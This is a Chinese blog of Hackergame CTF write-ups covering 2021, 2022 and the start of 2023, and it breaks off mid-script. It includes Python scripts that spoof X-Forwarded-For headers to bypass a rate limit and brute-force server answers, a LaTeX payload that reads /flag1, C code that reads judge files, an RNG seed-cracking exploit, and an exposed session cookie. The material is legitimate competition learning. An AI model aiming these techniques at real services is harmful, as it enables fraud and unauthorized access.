上了花絮也有小小的惊喜（没错我确实是有备而来 hiahiahia）。总体体验良好，明年再来。下面是我做出的几题的 wp，内容较水，可酌情移步至神（mcfx）的 wp。 签到 为了能让大家顺利签到，命题组把每一秒的 flag 都记录下来制成了日记本的一页。你只需要打开日记，翻到 Hackergame 2021 比赛进行期间的任何一页就能得到 flag！ 很简单的 web 题，注意到网址栏的后面的?page=&lt;当面的数字&gt;，直接修改，疯狂加 0，然后二分法试探，最终在 ?page=1635000000 的时候到达当前时间，出 flag (后来才知道这是时间戳)。 进制十六——参上 为严防 flag 泄漏以及其他存在于未来所有可能的意外灾难，神通广大的 Z 同学不仅强制要求每一道题目都加上权限和资源的限制，还给所有参与 Hackergame 2021 命题的计算机施加了一层法术结界。任何试图从结界逃逸的 flag 都会被无情抹除。 而一位明面上是计算机学院的新生，实则为物理学院暗部核心成员的 X 同学，在 Hackergame 2021 命题组已经潜伏多时。妄想趁比赛开始的午时，借阳火正旺之势，冲破 Z 同学的结界，以图片而非明文的形式，将 flag 悄悄传递出来。 好在 Z 同学法力之深厚，不可管窥蠡测。在 flag 被传出去的前两天，就已预知此事并将图片中的 flag 无声消泯了。 只是，这位 X 同学，虽然不会退出 Vim，但是似乎对打开十六进制编辑器颇有造诣…… 同样是很简单的题目，随便找个十六进制编辑器照着抄下然后得出右边的 flag （手打真的累，还打错了一个字母）。 去吧！追寻自由的电波 （前情提要） 为了打破 Z 同学布下的结界，X 同学偷偷搬出社团的业余无线电台试图向外界通讯。 当然，如果只是这样还远远不够。遵依史称“老爹”的上古先贤的至理名言，必须要“用魔法打败魔法”。X 同学向上级申请到了科大西区同步辐射实验室设备的使用权限，以此打通次元空间，借助到另一个平行宇宙中 Z 同学的法力进行数据对冲，方才于乱中搏得一丝机会，将 flag 用无线电的形式发射了出去。 考虑到信息的鲁棒性，X 同学使用了无线电中惯用的方法来区分字符串中读音相近的字母。即使如此，打破次元的强大能量扭曲了时空，使得最终接受到的录音的速度有所改变。 为了保障同步辐射设备的持续运转，组织牺牲了大量的能源，甚至以东北部分地区无计划限电为代价，把这份沉甸甸的录音文件送到了你的手上。而刚刚起床没多久，试图抢签到题一血还失败了的你，可以不辜负同学们对你的殷切期望吗？ 注：flag 花括号内只包含小写字母。 题目说了速度变了，显然是变快了，直接用经典音频隐写软件 Audacity 打开， Ctrl + A 全选，效果-改变速率，然后随手一拖把改变百分比拖到 70 就有非常标准清晰的单词，不看题目都能盲猜是首字母，后来查电报区分字符串中读音相近的字母的方法也确实对应，但是我还是不想自己听，打开翻译软件，嗯，语音识别不错，除了两个花括号我一开始没反应过来把也当成字母了QAQ。 猫咪问答 Pro Max 我猛然一看，就猛然看到这个猫咪问答，我直呼我直呼，上次看到这么这么的发言还是上次，这问答属于是典型的典型了，我之前还没发现，当我发现的时候我已经发现了，这问答就像一个问答，问答的内容充满了内容，我不禁感慨了一句感慨：希望下次看到这么这么的猫咪问答是下次。 题目的废话文学着实是让我涨了见识，这简直简直了，我以前从未想过有如此废话的废话文学，等我看见的时候已经看见了……第一问也是最难的一问，把百度必应谷歌翻烂了也没有，后来终于在一个专门存快照的国外网站上找到了那个已经消失的俱乐部的网页存档，第三问直接在中科大 Linux 用户协会官网找到，第五问也不难搜（虽然我没想到举报信可以发到这么奇怪的…呃不知怎么形容，目录？？去），第四问我看到论文直接望而生畏，搜索 data set 无果后果断爆破，合理猜测在 100 以下，但发现居然不行？？？万分怀疑的我试探性地把第二问改成 3 （或许是我对近五年的理解有问题？），也不行，改成 5 ，行了 （这协会真不要 face ），脚本如下： 1234567891011121314151617181920212223import requests as rimport refrom tqdm import tqdmdef main(): url = 'http://202.38.93.111:10001/' payload = {'q1': 20150504, 'q2': 5, 'q3': 'Development Team of Library', 'q4': 0, 'q5': '/dev/null'} headers = {'Cookie': 'session=eyJ0b2tlbiI6IjQ2Ok1FWUNJUUNyY2xUYU1XcG9sUzZqZzM0Z2IyZnMyeEJBNGtMa01DYnpKV1dERGNKWUJnSWhBT3RQTzBXSnhLMnRmcytWcVRReWd5eHdKMFY2dEZ6bGlycXVNSURHbU9EaSJ9.YXYWYA.2MXfMT2si0FkY-Z9jOc7V4jenTU'} for i in tqdm(range(100)): payload['q4'] = i _ = r.post(url=url, data=payload, headers=headers).text try: rst = re.findall( r'&lt;div class=&quot;alert alert-secondary&quot; role=&quot;alert&quot;&gt;((?:.|\\n)*?)&lt;/div&gt;', _)[0] except IndexError: s=re.findall(r'(flag{.*?})', _)[0] print ('\\n'+s) print('q4答案是'+str(i)) breakif __name__ == '__main__': main() 卖瓜 有一个人前来买瓜。 HQ：哥们，这瓜多少钱一斤啊？ 你：两块钱一斤。 HQ：What’s up！这瓜皮子是金子做的还是瓜粒子是金子做的？ 你：你瞧瞧现在哪有瓜啊？这都是大棚的瓜，只有 6 斤一个和 9 斤一个的，你嫌贵我还嫌贵呢。 （HQ 心里默默一算） HQ：给我来 20 斤的瓜。 你：行！ HQ：行？这瓜能称出 20 斤吗？ 你：我开水果摊的，还不会称重？ HQ：我问你这瓜能称出 20 斤吗？ 你：你是故意找茬，是不是？你要不要吧！ HQ：你这瓜要是刚好 20 斤吗我肯定要啊。那它要是没有怎么办啊？ 你：要是不是 20 斤，我自己吃了它，满意了吧？ （你开始选瓜称重） 在看过上一年的题目后可以直接看出是溢出，但是输入的数字过大后出现了浮点数，于是我上网搜了数据类型，随便复制了一个数（ 2 的多少次方来着？？忘了）过来输入到 9 斤那，出现了一个大负数，然后我掏出大宝贝—— Windows 计算器除以 6 ，结果去掉小数后再输入到 6 斤那，此时称上有了 -2 斤，嗯，可行，再来一次， -4 了，直接再放 4 个 6 斤，逃过一劫，得到 flag 。 FLAG 助力大红包 “听说没？【大砍刀】平台又双叒做活动啦！参与活动就送 0.5 个 flag 呢，攒满 1 个 flag 即可免费提取！” “还有这么好的事情？我也要参加！” “快点吧！我已经拿到 flag 了呢！再不参加 flag 就要发完了呢。” “那怎么才能参加呢？” “这还不简单！点击下面的链接就行” 这应该是让我学到最多东西的一题，看到题目的说明我第一反应就是通过 http 请求头伪造 IP 地址，搜到可以通过 X-Forwarded-For 实现，但中途我试图通过审查元素修改表单数据实现，结果提示前后端地址不匹配（后来才发现我没读题），于是找了个伪造 IP 地址的插件，这次是后端改了前端还是原来的，两个结合，发现可以成功砍到，手改几次后发现速度来不及，被迫找到 Python 的实现，一开始没加时间限制发现有令牌桶防着，就加了个停顿，脚本如下： 1234567891011import requestsimport timefrom tqdm import tqdmurl = 'http://202.38.93.111:10888/invite/77632ca2-c165-46ee-a8d2-ba89094b0401'ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0'for i in tqdm(range(256)): s = (str(i)+'.104.67.89') params = {&quot;ip&quot;: s,} request = requests.post(url, data=params, headers={'User-agent': ua, 'X-Forwarded-For':s}) time.sleep(0.9)print(request.text) Amnesia第一问 你的程序只需要输出字符串 Hello, world!（结尾有无换行均可）并正常结束。 编译指令：gcc -O file.c -m32 运行指令：./a.out 编译器版本：Docker 镜像 ustclug/debian:10 中 apt update &amp;&amp; apt -y upgrade &amp;&amp; apt install -y gcc=4:8.3.0-1 gcc-multilib=4:8.3.0-1 的版本 轻度失忆 编译后 ELF 文件的 .data 和 .rodata 段会被清零。 连接题目：nc 202.38.93.111 10051 或网页终端 判题脚本：下载 第一问不难，发现直接 printf(&quot;Hello,world!&quot;) 失败后改成用 printf(&quot;%c&quot;,&lt;每个字符的ASCII码&gt;)，但提交后错误，仔细检查发现多了几个奇怪的不可显示字符，应该是直接从网页复制的问题，删掉后提交得到flag，比赛结束后才知道还可以 putchar 呃呃 图之上的信息 小 T 听说 GraphQL 是一种特别的 API 设计模式，也是 RESTful API 的有力竞争者，所以他写了个小网站来实验这项技术。 你能通过这个全新的接口，获取到没有公开出来的管理员的邮箱地址吗？ 第一反应是 SQL 注入，但零基础的我忙活了半天才知道 /graphql 是端点，查看 http 请求看到负载语句 {query: &quot;{ notes(userId: 2) { id↵contents }}&quot;} 猜测 admin 的 id 是 1 ，于是疯狂查询 1 的 contents ，结果回显都是我没有权限，后来搜到了 Graphql 的 IDE ，找到了存储邮箱的地方，查询得到 flag 。 Easy RSA 自从 Hackergame 2018 公然揭露了大整数可以被神童口算分解的事实，RSA 在 hackergame 中已经只能处于低分值的地位了。如果不在其名称前面加上 Easy 这个单词，似乎就会显得完全对不起其他题目。 更何况，在本题的附件中，你还获得了构造 p 和 q 的方式。数理基础扎实的你应该可以轻松解决这些问题吧。 12345678910111213141516171819202122232425262728293031323334353637import mathimport sympyfrom Crypto.Util.number import *e = 65537def get_p(): x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451 y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439 value_p = sympy.nextprime((math.factorial(y)) % x) # Hint：这里直接计算会溢出，请你仔细观察 x 和 y 的特征 return value_pdef get_q(): value = [getPrime(256)] for i in range(1, 10): value.append(sympy.nextprime(value[i - 1])) print(&quot;value[-1] = &quot;, value[-1]) # value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967 n = 1 for i in range(10): n = n * value[i] q = getPrime(512) value_q = pow(q, e, n) print(&quot;value_q = &quot;, value_q) # value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819 return sympy.nextprime(q)# this destroyes the rsa cryptosystemp = get_p()q = get_q()m = int.from_bytes(open(&quot;flag.txt&quot;, &quot;rb&quot;).read(), &quot;big&quot;)c = pow(m, e, p * q)print(&quot;c = &quot;, c)# c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478 数理杀我的一题， acm 的题中有过类似的，威尔逊定理求出 $p$ ， $q$ 的话不难求，很好，现在是经典 RSA 了，什么，你问我到底怎么求的 p？哦？我还等你讲给我听呢（装傻，阿巴阿巴）。首先科普一下模逆元的概念，比如 $x\\equiv 3^{-1}\\mod 5$ ，这个并非是 $x=\\frac{1}{3}$ 的意思，而是 $x$ 满足 $3x\\equiv 1 \\mod 5$ ，这时口算得出 $x=2$ ，因为 $6\\equiv 1 \\mod5$ 嘛。然后是威尔逊定理，即 $(p-1)!\\equiv-1 \\pmod p$ 是 $p$ 为素数的充要条件。题目给出大数 $x$ 和比 $x$ 小一点的 $y$ ，要我们求 $y! \\mod x$ ，检验发现 $x$ 是一个素数，那么就有 $(x-1)!\\equiv-1 \\pmod x$ 。继而由 $(x-1)!=y(y+1)(y+2)\\cdots(x-1)$ ，不难推知$$y!\\equiv -1(x-1)^{-1}(x-2)^{-1}\\cdots (y+1)^{-1} \\mod\\ x$$python 计算逆元有两种方法，一种是 pow(a, -1, b)，另一种是用 gmpy2 库，即 gmpy2.invert(a,b) 完整 exp 如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import sympyfrom Crypto.Util.number import *from gmpy2 import inverte = 65537def get_p(): x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451 y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439 facymodx = -1 for i in range(y+1,x): facymodx = facymodx*invert(i,x)%x value_p = sympy.nextprime(facymodx) return value_pdef get_q(): value_inverse = [ 80096058210213458444437404275177554701604739094679033012396452382975889905967] for i in range(1, 10): value_inverse.append(sympy.prevprime(value_inverse[i-1])) n = 1 phi = 1 for i in range(10): n = n * value_inverse[i] phi = phi * (value_inverse[i]-1) value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819 d = invert(e, phi) q = pow(value_q, d, n) return sympy.nextprime(q)c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478if __name__ == '__main__': p = get_p() q = get_q() # print(len(str(q))) print(p) print(q) n = p * q phi = (p-1) * (q-1) d = invert(e, phi) m = pow(c, d, n) print(long_to_bytes(m))","link":"/2021/11/05/Hackergame2021-writeups/"},{"title":"Hackergame 2022 writeups","text":"好玩，爆赞！ Summary不知不觉，离上一年 Hackergame 都一年了 （有点像废话），作为我CTF的启蒙赛， Hackergame 2021 拿分最多的其实还是靠 web ，如今我却出乎意料地成为了队里的密码手。今年已经不像上年那么有空，前面的搜索题都没空做。总体来说，虽然做不出来，但好歹也能将大部分题目阅读一遍了。（有进步，但不多）没好意思填学校的组，直接在公开组注册，最终得分 2850 ，总排名 145 ，也就只有 math 榜上能看见我了。GZTime 还是如同上年一样直线上分，但意想不到的是 mcfx 也被一个不明来路的直线上分的老六偷了榜一。这里记录一下解出的题的题解，对解不出但尝试过的，也作一些记录，多少从中学到了一些东西。最近要期中考，断断续续更这里吧。 签到点开网页，发现是一个手写签名，四个框内，依次要在 2 秒，1 秒，0.1 秒，0.0 秒内分别写下 2022 才能通过。首先直接靠手速必然是不行的，因为第四个框最多只能留下一个点，于是尝试点了个提交，发现顶上的 url 多了个 ?result=????，果然还是和上年一样的套路，四个问号改成 2022 ，回车，得到 flag 。 猫咪问答喵第一问直接搜就有，第二问没找到，第三问也直接搜，第四问没找，第六问爆破出来的（）第五问也没找出来，但是找到一个网站叫 Censys.io ，似乎可以搜索 ssh 的 sha256 指纹查 host ，以及有关一堆乱七八糟的查询，不知道以后能不能用得上。 家目录里的秘密Level1 直接搜目录内文件就有。Level2 没下 Rclone ，以为要找到那个 rclone.config 文件里的真实域名再ftp进去。。。 HeiLangCtrl + H，将 | 全部替换成 ]=a[ 即可。 Xcaptcha用 pyppeteer 干了，简单粗暴。代码如下： 123456789101112131415161718192021222324252627import asynciofrom pyppeteer import launchasync def main(): browser = await launch({ 'executablePath': r'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 'headless': False, 'args': ['--no-sandbox', '--window-size=1366,850'] }) page = await browser.newPage() await page.setViewport({'width':1366,'height':768}) await page.goto('http://202.38.93.111:10047/?token=&lt;your_token&gt;') await page.click('.img-fluid') captcha1 = await page.querySelectorEval('label[for=&quot;captcha1&quot;]', 'node =&gt; node.innerText') captcha2 = await page.querySelectorEval('label[for=&quot;captcha2&quot;]', 'node =&gt; node.innerText') captcha3 = await page.querySelectorEval('label[for=&quot;captcha3&quot;]', 'node =&gt; node.innerText') res1=eval(captcha1[:-5]) res2=eval(captcha2[:-5]) res3=eval(captcha3[:-5]) await page.type('#captcha1', str(res1)) await page.type('#captcha2', str(res2)) await page.type('#captcha3', str(res3)) await page.click('#submit') flag = await page.querySelectorEval('body &gt; div &gt; p:nth-child(4)', 'node =&gt; node.innerText') print(flag) await browser.close()asyncio.get_event_loop().run_until_complete(main()) 旅行照片2.0Level1 直接用在线网站就能看，但 EXIF 版本信息显示是 0231 ，结合题目提示，改成 2.31 就行。Level2 一开始谷歌和百度识图都出不来，然后发现识图的结果都是夕阳，于是把图片截去夕阳部分再谷歌识图，就能得到拍摄角度几乎一样但是白天的日本千叶市美滨区的海洋球场，然后找机场就找头疼了，放弃。在做复变函数的时候无意间发现 wolfram 可以通过看到飞机的地点和时间直接查询航班，但是是会员功能。 猜数字（未解出）写了个脚本暴猜一晚上没出，果然运气还是太差了。正解是 NaN ，不提。这里贴一下我爆破的脚本，供君一乐： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import requests as rimport reurl = 'http://202.38.93.111:18000/state'cookie = '&lt;your_cookie&gt;'auth = '&lt;your_auth&gt;'def guess(num): data = f'&lt;state&gt;&lt;guess&gt;{num}&lt;/guess&gt;&lt;/state&gt;' r.post(url, headers={'Cookie': cookie, 'authorization': auth}, data=data) def check(): res = r.get(url, headers={'Cookie': cookie, 'authorization': auth}) resp = re.findall(r'&lt;guess less=&quot;(\\w+)&quot; more=&quot;(\\w+)&quot;&gt;(.*?)&lt;/guess&gt;', res.text) if not resp: return ('true', 'true', '0') return resp[0]def crack(n): guess(str(n/1000000)) less, more, num = check() # print(less, more, num) left = 0 right = 1000000 times = 1 while less != 'true' or more != 'true': times += 1 if less == 'true': left = float(num)*1000000 elif more == 'true': right = float(num)*1000000 else: break num = (left + right) // 2 tmp = num guess(str(num/1000000)) less, more, num = check() # print(less, more, num) return times, tmpif __name__ == '__main__': l = [500000] while True: # n = 500000*(len(l)+1) - sum(l) # n = min(n, 1000000) # n = max(n, 0) n = 1000000 - sum(l)//len(l) times, num = crack(n) l.append(int(num)) print(times, n, num, sum(l)//len(l)) if times == 1: break print('done') LaTeX机器人Level1 我的解法： 1\\newread\\myread \\openin\\myread=/flag1 \\read\\myread to \\fileline \\fileline{} Level2 打不通，但找到一个可以取消所有转义的函数 （但我忘了是什么）。 安全的在线测评我 Level1 的解法，但似乎预期是用编译器读？ 123456789101112131415#include &lt;stdio.h&gt;int main() { // read 2 lines from file char buf[400]; scanf(&quot;%s&quot;, buf); FILE *fp = fopen(&quot;./data/static.out&quot;, &quot;r&quot;); fgets(buf, 400, fp); printf(&quot;%s&quot;, buf); fgets(buf, 400, fp); printf(&quot;%s&quot;, buf); fclose(fp); return 0;} Flag自动机第一回正式打逆向，首先题目是一个恶作剧程序，就是不给点 狠心夺取 按钮，于是拖进 IDA 看到有 rand 函数，不难联想到按钮的新位置是通过这个函数产生的，于是再查看 rand 函数的调用，发现只有两处——分别是按钮的 X 坐标和 Y 坐标。然后我的解法是把汇编上把位置 patch 成 0 ，这样按钮就只刷新在左上角了。点击按钮后，弹出一个提示框——获取flag失败！您不是本机的“超级管理员”！ ，于是再次在 IDA 找到一个判断，若该变量不等于 114514 ，则弹出失败的提示框，这里在汇编把 jz patch 成 jnz 就行。最后成功获取 flag 。 杯窗鹅影Level1 我的解法如下： 1234567891011121314#include &lt;stdio.h&gt;// read file in /flag1int main(void) { FILE *fp = fopen(&quot;/flag1&quot;, &quot;r&quot;); if (fp == NULL) { printf(&quot;open file failed&quot;); } char buf[0x100]; fgets(buf, 0x100, fp); printf(&quot;%s&quot;, buf); return 0;} 蒙特卡洛轮盘赌测试得出 clock() 的大小在 1000 左右，那么假定时间基本同步的情况下爆破 1000 次左右即可出结果。编译开 -O3 的情况下目测大约每秒 20 次，大约在 50s 内可出结果。代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import subprocessimport timefrom pwn import *import os# compile the c programos.system('gcc -o setseed setseed.c -O3')def seedtores(seed): p = subprocess.run( ['./setseed', str(seed)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT ) return (p.stdout.decode()).split()def crack(pi2, t): p1, p2 = pi2 while True: res = seedtores(t) print(res[0],res[1], res[2], end='\\r') if res[1] == p1 and res[2] == p2: return t, res else: t += 1now = int(time.time())print(now)r = remote('202.38.93.111', 10091)token = b'&lt;your_token&gt;'r.sendlineafter(b'token:', token)r.sendlineafter('请输入你的猜测（如 3.14159，输入后回车）：'.encode(), b'0')r.recvuntil('正确答案是：'.encode())p1 = r.recvline().decode().strip()r.sendlineafter('请输入你的猜测（如 3.14159，输入后回车）：'.encode(), b'0')r.recvuntil('正确答案是：'.encode())p2 = r.recvline().decode().strip()info('p1: %s, p2: %s', p1, p2)t, guess = crack((p1, p2), now)success('guess: %s', guess)r.sendlineafter('请输入你的猜测（如 3.14159，输入后回车）：'.encode(), guess[3].encode())r.sendlineafter('请输入你的猜测（如 3.14159，输入后回车）：'.encode(), guess[4].encode())r.sendlineafter('请输入你的猜测（如 3.14159，输入后回车）：'.encode(), guess[5].encode())print(r.recvlines(3)) 其中 setseed.c 代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;#include &lt;string.h&gt;double rand01(){ return (double)rand() / RAND_MAX;}// let main receive a seedint main(int argc, char *argv[]){ // disable buffering setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); unsigned int seed = 1666610168+946; seed = atoi(argv[1]); printf(&quot;%u\\n&quot;,seed); srand(seed-1); int games = 5; int win = 0; int lose = 0; char target[20]; char guess[2000]; for (int i = games; i &gt; 0; i--) { int M = 0; int N = 400000; for (int j = 0; j &lt; N; j++) { double x = rand01(); double y = rand01(); if (x*x + y*y &lt; 1) M++; } double pi = (double)M / N * 4; sprintf(target, &quot;%1.5f&quot;, pi); printf(&quot;%1.5f\\n&quot;, pi); } return 0;} 置换魔群打通了，还行。置换群的概念题目已经说得很清楚了，这里不再赘述。Level1 是生成一个置换群 $A_n$ ，并给出 $x^e$ 和 $e=66537$ ，求群 $A_n$ 的元素 $x$ 。那么这就很类似 RSA 了，首先 RSA 的解密原理是，对于模 $n$ 群，对其中的任意元素 $x$ ，都有 $x^{\\varphi(n)}\\equiv1\\mod n$ ，这里的$\\varphi(n)$称为群的阶。所以 $m^{ed}\\equiv m^{k\\varphi(n)+1}\\equiv (m^{\\varphi})^km\\equiv m\\mod n$ 。（srds，这竟然是我在做这道题的时候推公式想明白的）那么回到这个题就很简单了，只需求出 $A_n$ 的阶，然后取 $e$ 模 $A_n$ 阶的逆元就能得到解密指数 $d$ 了。题目给了简陋的求群的阶的函数，但速度比较慢，用 sagemath 实现了一下，快了很多。关键代码如下： 12345def solve(n, c, e=65537): S = SymmetricGroup(n) d = pow(e, -1, S.order()) res = S(c) ** int(d) return str(list(res.tuple())) # 这里应该有更优雅的写法 Level2 同样生成一个置换群 $A_n$ ，给出一个元素 $g$ 和 $g^y$ ，要求 $y$ 。那么这就是一个离散对数问题了，用 sagemath 的 discrete_log 函数就能解决。当然如果你和我一样不知道 sagemath 的置换群用的哪个函数，可以使用万能的 copilot 直接先敲一行注释，然后回车按 tab 。关键代码如下：（只有两行，乐） 123def solve(g, y, n): S = SymmetricGroup(n) return discrete_log(S(y), S(g)) Level3 同样是离散对数问题，允许输入两个元素 $g_1$ 和 $g_2$ ，然后给出 $g_1^m$ 和 $g_2^m$ ，要求 $m$ 。上面提到了群的阶，这里引入元素的阶的概念：比如模 $5$ 的群中，群的阶为 $\\varphi(5)=4$ ，也就是说 $1^4\\equiv2^4\\equiv3^4\\equiv4^4\\mod 5$ ，但是我们发现， $1^1 \\mod1$ 就已经是 $1$ 了， $4^2\\mod 5$ 也一样不需要达到 $4$ 次方就到 $1$ ，这里我们称最小的 $k$ 使元素 $x$ 满足 $x^k\\equiv1\\mod n$ 为元素 $x$ 的阶，也就是说如上的例子中 $1$ 的阶为 $1$ ， $4$ 的阶为 $2$ 。现在回到题目，我们发现难点在于要求的 $m$ 是比较大的，记 $g_1$ 和 $g_2$ 的阶分别为 $a$ 和 $b$ ，容易知道我们求离散对数得到的只是 $m_1\\equiv m\\mod a$ 和 $m_2\\equiv m\\mod b$ ，由中国剩余定理可知最后求出的 $m’\\equiv m\\mod \\mathrm{lcm}(a,b)$ ，也就是说，我们构造的 $g_1$ 和 $g_2$ 的阶的最小公倍数需要足够大才能得到 $m$ 。 然后不难搜得求置换群元素的阶最大的问题可以转化成求一组数的和不超过 $n$ ，如果使这组数的最小公倍数最大的问题。显然这组数应该是互质的，但这并不意味着这组数要全为质数！比如 $n=7$ 时，我们可以得到 $3\\times4$ 是最大的， $3$ 和 $4$ 互质，但 $4$ 不是质数。如此我们可以手推几个，然后在数列网站 OEIS 上搜索得到数列A000793，关于这个数列的介绍为 Landau's function g(n): largest order of permutation of n elements. Equivalently, largest LCM of partitions of n.显然这正是我们要找的，于是复制下面给出的代码就可以生成 $g_1$ 了，而对于 $g_2$ ，我的做法是拿到 $g_2$ 中最大数后面的素数列填充进去，若不能继续填充且空间还有剩余，则使最后两个素数尽可能大且尽可能相近。最后我的蹩脚算法得出来的界大部分比题目的界要大，有小部分小 $1/10$ 左右，基本上都能大过 $m$ 。 贴一下完整的垃圾代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101from pwn import *from sage.all import *from sympy import primerange, prevprimep = remote(&quot;202.38.93 .111&quot;, 10114)# context.log_level = &quot;debug&quot;token = &lt;your_token&gt;p.sendlineafter(b&quot;token: &quot;, token.encode())p.sendlineafter(b&quot;&gt; your choice: &quot;, b&quot;3&quot;)def n2perm(l): ll = [] i = 1 for x in l: ll.append(tuple(range(i, i+x))) i += x return lldef aupton(N): # compute terms a(0)..a(N) V = [1 for _ in range(N+1)] for i in primerange(2, N+1): for j in range(N, i-1, -1): hi = V[j] pp = i while pp &lt;= j: hi = max((pp if j == pp else V[j-pp]*pp), hi) pp *= i V[j] = hi return Vdef get_fac(n): prod = data[n - 1] f = factor(prod) f_ = str(f).split('*') fl = [] for i in f_: if '^' in i: fl.append(eval(i.replace('^', '**'))) else: fl.append(int(i)) return fldef get_fac2(n, fl1_prod): fl2 = [] i = 2 while sum(fl2) &lt; n: if gcd(i, fl1_prod) == 1: fl2.append(i) i += 1 if sum(fl2) &gt; n: fl2.pop() fl2.pop() fl2.append(prevprime(n - sum(fl2))) return fl2def get_n2l(n): l1 = get_fac(n) l2 = get_fac2(n, prod(l1)) return n2perm(l1), n2perm(l2)def get_n(): p.recvuntil(b'[+] DH public key: n = ') n = int(p.recvline()[:-1].decode()) return ndef get_bound(): p.recvuntil(b'[+] The upper bound for my private key is ') bound = int(p.recvline()[:-1].decode()) return bounddef get_pub(g): p.sendlineafter(b'(a list): ',g.encode()) p.recvuntil(b' : ') y = eval(p.recvline()[:-1].decode()) return yfor i in range(15): n = get_n() bound = get_bound() info(f&quot; n = {n}&quot;) info(f&quot;bound = {bound}&quot;) S = SymmetricGroup(n) data = aupton(2000) g,g_ = get_n2l(n) g1, g2 = S(g), S(g_) opt = lcm(g1.order(), g2.order()) info(f&quot; opt = {opt}&quot;) if opt &lt; bound: warning(&quot;opt &lt; bound&quot;) pub1 = get_pub(str(list(g1.tuple()))) pub2 = get_pub(str(list(g2.tuple()))) pub1, pub2 = S(pub1), S(pub2) m1, m2 = discrete_log(pub1,g1), discrete_log(pub2,g2) # success(f&quot;m1 = {m1}\\nm2 = {m2}&quot;) m = crt([m1,m2],[g1.order(),g2.order()]) success(f&quot; m = {m}&quot;) p.sendlineafter(b'&gt; your answer: ', str(m).encode()) res = p.recvline().decode() assert res == 'Good job\\n', resprint(p.recvline().decode()) 矩阵之困（未解出）开赛做完签到后看的第一题，结果最后也成为本场比赛最难的 1 解题（表面看起来是 2 解，但其实两个号都是 mcfx），不得不说我眼光真好（）查到三向量内积可表示成 $a^TBc$ ，其中 $B$ 的对角线为 $b$ ，但似乎没什么用。用 z3 梭了几天出不来，放弃。 片上系统（未解出）发现 pulseview 还挺有意思。 量子藏宝图挺有意思的，一直只研究后量子密码学，却没看过量子密码，正好补充知识。 企鹅拼盘Level1 手试即可，结果为 1000 。 火眼金睛的小ELevel1 直接装个 bindiff 人工比对，但是正确率不太高，需要多试几次，有时甚至 bindiff 连函数都没检测出来。。。","link":"/2022/10/30/Hackergame2022-writeups/"},{"title":"Hackergame 2023 writeups","text":"打 Hackergame 的第三年。 Summary又是一年 Hackergame，今年终于进了一次前 100，总排 72，math 榜也能看到我。开赛的时候在东校参加迎新大会，校巴的上车点和下车点竟然是不一样的，没坐上回去的车，最后还得自己买高铁，要是校巴还报销不了的话是真的想似了。GZTime 还是直线上分，每年的保留节目了属于是。ZRHan 也打到了第 9，我校首次在 hg 前十里占两席。mcfx 也又 AK 了，现在的我没以前那么菜了，才更觉得他的数学水平简直不像人，甚至有种比春哥还强一大截的感觉，有空得翻翻他 blog，看看能不能淘到点什么。打到一半的时候我实在受不了这一天比一天卡的电脑了，就重装了一下系统，这下啥环境都没了，装 sagemath 也装了半天，好在最后装好了，但也因此几乎停止了上分。 签到虽然做了两年签到的我大概也能猜到什么套路，但还是玩了一下。要求喊出 “Hackergame 启动！” 并且相似度要达到 99.9% 才能拿到 flag，直接随便意思一句点提交，url 出现 ?similarity=77.5930335706637，直接改成 100，回车。点击获取 flag，然后我屏幕就白了，然后。。。见白知原好吧。 猫咪小测 想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？（30 分）手动爆破，12 层，还挺高。 今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 10 的多少次方每立方秒差距？（30 分）提示：是一个非负整数。脚本爆破，代码如下： 12345678910111213141516171819import requests as rimport refrom tqdm import tqdmdef crack(q2): url = 'http://202.38.93.111:10001/' payload = {'q1': '12', 'q2': q2, 'q3': '12', 'q4': 0} headers = {'Cookie': 